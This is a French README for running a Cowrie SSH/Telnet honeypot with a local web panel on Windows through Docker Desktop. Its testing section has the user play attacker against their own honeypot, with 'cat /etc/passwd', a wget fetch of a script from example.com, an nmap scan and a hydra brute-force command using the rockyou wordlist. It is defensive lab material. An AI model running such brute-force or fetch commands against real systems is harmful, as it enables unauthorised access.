# Honeypot Cowrie + panel web (Windows / Docker Desktop)

## Prérequis
1. Installe **Docker Desktop** (docker.com) et laisse-le activer **WSL 2** à l'installation.
2. Redémarre le PC, puis lance Docker Desktop (attends que la baleine soit verte).

> Si tu avais désactivé Hyper-V pour la virtualisation imbriquée, il faut le réactiver :
> `bcdedit /set hypervisorlaunchtype auto` (en administrateur) puis redémarrer.

## Lancer le honeypot
Dans un terminal (PowerShell), dans ce dossier :

```powershell
docker compose up -d --build
```

- Faux SSH : port **2222** — faux Telnet : port **2223**
- Panel web : **http://localhost:8080** (accessible uniquement depuis ton PC)

Windows peut demander d'autoriser Docker dans le pare-feu : autorise sur les **réseaux privés** seulement.

## Tester (jouer l'attaquant)
Depuis PowerShell :

```powershell
ssh root@localhost -p 2222
```
Par défaut `root` est accepté avec presque n'importe quel mot de passe (sauf `root` et `123456`).
Tape des commandes (`whoami`, `uname -a`, `cat /etc/passwd`, `wget http://example.com/test.sh`) puis regarde le panel.

Depuis une VM Kali : remplace `localhost` par l'IP de ton PC (`ipconfig`) :
```bash
nmap -sV -p 2222 IP_DU_PC
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP_DU_PC -s 2222 -t 4
```

## Commandes utiles
```powershell
docker compose logs -f cowrie     # logs bruts de Cowrie
docker compose stop               # arrêter
docker compose start              # relancer
docker compose down -v            # tout supprimer (y compris les logs capturés)
```

## Sécurité
- Tant que tu ne fais **pas de redirection de port sur ta box**, seul ton réseau local peut atteindre le honeypot.
- Ne redirige jamais le port 8080 (le panel) vers Internet.
- Pour capter de vraies attaques d'Internet, préfère un **VPS** plutôt que ton PC perso.
- Le panel affiche des données envoyées par les attaquants : elles sont insérées en texte brut (pas de HTML) pour éviter les injections XSS.
